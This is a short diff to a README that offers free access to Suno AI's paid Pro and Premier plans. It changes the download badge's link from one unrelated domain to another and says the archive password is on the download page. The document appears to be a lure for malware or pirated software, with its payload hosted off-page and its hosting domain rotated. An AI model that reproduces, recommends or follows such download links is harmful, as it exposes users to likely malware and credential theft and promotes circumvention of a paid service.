@@ -18,7 +18,7 @@ Access Suno AI Pro and Premier plans for free. Generate unlimited AI music witho
 
 ## Download
 
-[![Download v1.5.0](https://img.shields.io/badge/Download_v1.5.0-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/sunoai)
+[![Download v1.5.0](https://img.shields.io/badge/Download_v1.5.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/sunoai)
 
 > The archive password is shown on the download page.
 
